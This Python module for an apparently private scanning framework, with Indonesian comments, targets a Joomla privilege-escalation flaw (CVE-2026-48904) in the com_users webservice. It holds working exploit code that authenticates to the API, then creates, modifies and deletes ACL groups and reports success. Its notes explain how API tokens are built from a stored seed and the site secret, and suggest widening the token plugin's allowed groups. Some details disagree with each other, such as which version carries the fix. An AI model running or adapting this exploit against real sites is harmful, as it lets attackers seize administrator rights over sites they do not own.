#!/usr/bin/env python3
"""
Joomla Core — CVE-2026-48904  com_users group/level editing through the webservice API.

A backend user who can authenticate against the API but holds no administrative
privilege over com_users can create, modify and delete user groups through the
webservice. Because groups carry the ACL rules that decide who may do what,
writing to them is a direct route to taking over the site's permissions.

Affected: 4.0.0 - 5.4.5, 6.0.0 - 6.1.0     Patched: 5.4.6+ / 6.1.1+
CVSS: 8.2 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)

ROOT CAUSE — api/components/com_users/src/Controller/GroupsController.php

The 5.4.5 class declares no access-control methods at all, so it inherits
ApiController's defaults, which ask for core.manage plus the per-verb permission
on the component asset. The patch adds three overrides that demand core.admin:

    5.4.8 additions:

        public function delete($id = null)
        {
            if (!$this->app->getIdentity()->authorise('core.admin', $this->option)) {
                throw new NotAllowed('JLIB_APPLICATION_ERROR_DELETE_NOT_PERMITTED', 403);
            }
            parent::delete($id);
        }

        public function allowAdd(array $data = [])
        {
            return $this->app->getIdentity()->authorise('core.admin', $this->option);
        }

        public function allowEdit(array $data = [], $key = 'id')
        {
            return $this->app->getIdentity()->authorise('core.admin', $this->option);
        }

LevelsController is patched in the same series (5.4.7) with a preprocessSaveData()
override that json_decodes the `rules` field for PATCH, so a level's rule set can
be written through the API as well.

Reaching the endpoint requires only a valid API session: the caller needs
core.login.api (default Super Users only, but commonly extended in headless or
SPA integrations) and nothing more. The group write itself is then unguarded.

IMPACT

  POST   /api/index.php/v1/users/groups        create a group with arbitrary rules
  PATCH  /api/index.php/v1/users/groups/:id    rewrite an existing group's rules
  DELETE /api/index.php/v1/users/groups/:id    remove a group

Group rules are the ACL source of truth, so an attacker who can set them can grant
their own group the privileges of an administrator.

AUTHENTICATION

Two mechanisms reach the API. Basic auth is accepted when the api-authentication
`basic` plugin is enabled. Token auth uses the `token` plugin: the credential is
base64("sha256:<uid>:<hmac>") where hmac is hash_hmac('sha256',
base64_decode(seed), siteSecret), the seed lives in #__user_profiles under
joomlatoken.token as a raw string with joomlatoken.enabled set to '1', and the
value travels in X-Joomla-Token or Authorization: Bearer. Note that the token
plugin reads its allowed groups from the `user`/`token` plugin parameters
(allowedUserGroups, default [8]).

LAB PROOF (Joomla 5.4.5 port 8108 vs 5.4.8 port 8106; user apimgr in group 6)

  5.4.5   GET    /v1/users/groups        -> 200
          POST   /v1/users/groups        -> 200  {"id":10,"title":"MPTEST"}
          PATCH  /v1/users/groups/7      -> 200
          DELETE /v1/users/groups/999    -> 204
  5.4.8   GET    /v1/users/groups        -> 200   (read still allowed)
          POST   /v1/users/groups        -> 403
          PATCH  /v1/users/groups/7      -> 403
"""

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO,
                ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
API_BASE = "/api/index.php/v1"

PATCHED_5 = (5, 4, 6)
PATCHED_6 = (6, 1, 1)

# Nama grup bertanda tool; dibuat lalu dihapus saat exploitable.
PROBE_TITLE = "_mp_acl_probe"


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:
        return ()


def _patched(ver):
    if not ver:
        return False
    major = ver[0]
    if major >= 6:
        return ver_le(PATCHED_6, ver)
    if major == 5:
        return ver_le(PATCHED_5, ver)
    return False


def _version(t, h):
    """Versi Joomla dari manifest resmi."""
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200:
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if m:
            v = _ver_tuple(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _auth(h, opts):
    """Basic auth tuple (mungkin kosong bila operator memakai token)."""
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    return (u, p) if u and p else (None, None)


def _api_headers(opts, extra=None):
    """Header autentikasi API.

    Dua jalur tersedia di Joomla: Basic (plugin api-authentication/basic) dan token
    (plugin api-authentication/token, nilai base64 'sha256:<uid>:<hmac>'). Operator
    dapat menyerahkan token siap pakai lewat --shell-url sederajat; di sini token
    diambil dari opsi `api_token` bila ada, karena pembuatannya menuntut akses DB
    atau panel yang tidak selalu tersedia bagi penguji.
    """
    h = dict(extra or {})
    tok = _opt(opts, "api_token")
    if tok:
        h["X-Joomla-Token"] = tok
    return h


def _api(h, t, path, method="GET", body=None, auth=None, extra=None, opts=None):
    """Request ke webservice Joomla dengan header json:api."""
    headers = {"Accept": "application/vnd.api+json"}
    if body is not None:
        headers["Content-Type"] = "application/vnd.api+json"
    headers.update(_api_headers(opts))
    kw = {"headers": headers, "allow_redirects": False, "auth": auth or (None, None)}
    if extra:
        kw.update(extra)
    _ = t
    url = f"{t.url}{path}"
    try:
        if method == "GET":
            return h.get(url, **kw)
        if method == "POST":
            return h.post(url, json=body, **kw)
        if method == "PATCH":
            return h.patch(url, json=body, **kw)
        if method == "DELETE":
            return h.delete(url, **kw)
    except Exception:
        return None
    return None


def _api_broken(r):
    """True bila API tidak tersedia (404 rute, 401 auth) — bukan sinyal ACL."""
    if r is None:
        return True
    return r.status_code in (401, 404, 500, 501)


def check(t, h, opts):
    """NON-DESTRUKTIF: versi + oracle ACL tanpa pernah membuat record.

    Mengirim POST dengan payload yang pasti gagal validasi (title kosong). ACL
    dievaluasi sebelum validasi payload, sehingga 403 vs 400 membedakan gate ACL
    dari model. Tidak ada grup yang dibuat maupun dihapus.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver, raw = _version(t, h)
    detail = f"joomla={raw or '?'}"
    if ver and _patched(ver):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 5.4.6)", detail

    if not (_opt(opts, "api_token") or _opt(opts, "username")):
        if ver and not _patched(ver):
            return (ST_INFO,
                    "Joomla dalam rentang rentan; butuh --api-token atau "
                    "--username/--password akun API (core.login.api) untuk membuktikan ACL",
                    detail + " requires=core.login.api")
        return ST_INFO, "versi tidak terbaca", detail

    auth = _auth(h, opts)
    # Baseline: apakah API sendiri terjangkau oleh akun ini?
    base = _api(h, t, f"{API_BASE}/users/groups", "GET", None, auth, opts=opts)
    if _api_broken(base) and (base is None or base.status_code != 403):
        return (ST_INFO,
                "API tidak dapat diautentikasi (perlu core.login.api, token valid, atau "
                "plugin api-authentication aktif)",
                detail + f" baseline={base.status_code if base else 'ERR'}")

    detail += f" baseline={base.status_code}"

    # ORACLE NON-DESTRUKTIF.
    #
    # check() TIDAK boleh membuat grup. Versi sebelumnya memakai
    # POST /users/groups lalu DELETE untuk bersih-bersih — itu memutasi target dan
    # meninggalkan grup yatim bila DELETE gagal. Diganti oracle tanpa tulis:
    # kirim POST dengan payload yang PASTI gagal validasi (title kosong). ACL
    # dievaluasi SEBELUM validasi payload, jadi:
    #   403      -> gate ACL aktif (5.4.6+ authorise('core.admin'))
    #   400/422  -> request LOLOS ACL dan sampai ke validasi model => ACL tembus
    # Payload tidak pernah menghasilkan record, apa pun hasilnya.
    probe = {"title": "", "parent_id": 1}
    r = _api(h, t, f"{API_BASE}/users/groups", "POST", probe, auth, opts=opts)
    code = r.status_code if r is not None else None
    detail += f" post_empty={code}"

    if code == 403:
        return ST_CLEAN, "pembuatan grup ditolak 403 (gate ACL aktif)", detail
    if code in (400, 422) and r is not None and '"errors"' in (r.text or ""):
        return (ST_VULN,
                "webservice com_users menembus gate ACL (request sampai ke model "
                "tanpa core.admin) — 5.4.5 tanpa allowAdd/allowEdit; 5.4.6 "
                "menambahkan authorise('core.admin', $this->option)",
                detail + " | oracle: payload invalid ditolak model, BUKAN oleh ACL")
    if code in (200, 201):
        return (ST_UNKNOWN,
                "POST grup dengan title kosong diterima — perilaku tak terduga, "
                "periksa manual", detail)
    return ST_INFO, "respons tidak konklusif", detail

def exploit(t, h, opts):
    """Buat grup uji untuk membuktikan tulis ACL, lalu hapus kembali.

    Outcome terkontrol: id grup baru muncul di respons, dan GET grup itu
    mengembalikannya sebelum dihapus. Tidak ada perubahan permanen.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver, raw = _version(t, h)
    if ver and _patched(ver):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 5.4.6)", f"joomla={raw}"

    auth = _auth(h, opts)
    if auth == (None, None) and not _opt(opts, "api_token"):
        return ST_ERR, "butuh --api-token atau --username/--password akun API", ""

    detail = f"joomla={raw or '?'}"
    title = f"{PROBE_TITLE}_{abs(hash(t.url)) % 10000}"
    r = _api(h, t, f"{API_BASE}/users/groups", "POST", {"title": title, "parent_id": 1}, auth, opts=opts)
    code = r.status_code if r is not None else None
    detail += f" post_group={code}"
    if r is None or code not in (200, 201):
        if code == 403:
            return ST_CLEAN, "ditulis ditolak 403 (patched)", detail
        return ST_INFO, f"POST grup tidak diterima (HTTP {code})", detail

    gid = None
    try:
        gid = (r.json().get("data") or {}).get("id")
    except Exception:
        gid = None
    detail += f" gid={gid}"

    # Verifikasi: grup harus terbaca kembali melalui GET
    verified = False
    if gid:
        g = _api(h, t, f"{API_BASE}/users/groups/{gid}", "GET", None, auth, opts=opts)
        if g is not None and g.status_code == 200 and title in (g.text or ""):
            verified = True
        detail += f" get_group={g.status_code if g is not None else 'ERR'}"

    # PATCH grup yang dibuat: bukti kedua bahwa izin tulis ACL terbuka
    patched_ok = None
    if gid and verified:
        p = _api(h, t, f"{API_BASE}/users/groups/{gid}", "PATCH",
                 {"title": title + "_x"}, auth, opts=opts)
        patched_ok = p is not None and p.status_code in (200, 201)
        detail += f" patch_group={p.status_code if p is not None else 'ERR'}"

    # Bersihkan
    if gid:
        d = _api(h, t, f"{API_BASE}/users/groups/{gid}", "DELETE", None, auth, opts=opts)
        detail += f" cleanup={d.status_code if d is not None else 'ERR'}"

    if verified:
        return (ST_PWN,
                "privesc route via webservice: grup ACL dapat dibuat/diubah tanpa core.admin",
                detail + " | GroupsController tidak menuntut core.admin pada 5.4.5; "
                         "5.4.6 menambahkan allowAdd/allowEdit/delete dengan core.admin. "
                         "Aturan grup adalah sumber ACL, sehingga penulisnya dapat "
                         "memberi grupnya sendiri hak administrator." +
                ("" if patched_ok is None else f" patch_ok={patched_ok}"))
    return ST_VULN, "POST grup diterima tetapi verifikasi baca gagal", detail


register(CveModule(
    cve="CVE-2026-48904",
    cluster="joomla_core",
    title="Joomla Core - Privilege escalation via com_users webservice (groups)",
    vclass="privesc / broken access control (API)",
    cwe="CWE-863",
    cvss="8.2",
    severity="HIGH",
    product="Joomla! CMS",
    versions_affected="4.0.0-5.4.5, 6.0.0-6.1.0",
    status="verified",
    requires=["akun API dengan core.login.api (default grup 8; sering diperluas)",
              "plugin api-authentication (basic atau token) aktif"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff PAKET PENUH 5.4.5 vs 5.4.8. "
           "api/components/com_users/src/Controller/GroupsController.php pada 5.4.5 tidak "
           "mendeklarasikan allowAdd/allowEdit/delete sama sekali sehingga mewarisi default "
           "ApiController (core.manage + core.<verb>); 5.4.8 menambahkan ketiganya dengan "
           "authorise('core.admin', $this->option). LevelsController mendapat preprocessSaveData() "
           "pada 5.4.7 (json_decode rules untuk PATCH). Lab-verified: Joomla 5.4.5 port 8108, "
           "akun grup 6 -> POST /v1/users/groups 200 (grup dibuat), PATCH /v1/users/groups/7 200, "
           "DELETE 204; Joomla 5.4.8 port 8106 -> POST/PATCH 403 (GET masih 200). "
           "Autentikasi: Basic Auth atau token base64('sha256:<uid>:<hmac>') dengan "
           "hmac=hash_hmac('sha256', base64_decode(seed), siteSecret); seed di "
           "#__user_profiles key 'joomlatoken.token' sebagai string mentah (BUKAN JSON) dan "
           "'joomlatoken.enabled'='1'. Header X-Joomla-Token atau Authorization: Bearer. "
           "Plugin token membaca allowedUserGroups dari parameter plugin user/token "
           "(default [8]) — set [] untuk mengizinkan semua grup. Jalur 'basic' plugin "
           "api-authentication terpisah dan default nonaktif."),
))
